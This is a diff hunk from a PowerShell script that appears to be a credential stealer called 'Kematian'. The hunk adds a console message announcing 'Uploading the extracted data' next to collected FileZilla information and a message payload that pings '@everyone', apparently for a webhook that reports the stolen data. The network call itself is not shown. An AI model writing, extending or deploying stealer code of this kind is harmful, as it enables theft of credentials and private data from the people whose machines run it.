@@ -1018,7 +1018,7 @@ FileZilla: $filezilla_info
         'False'
     }
 
-	
+	Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
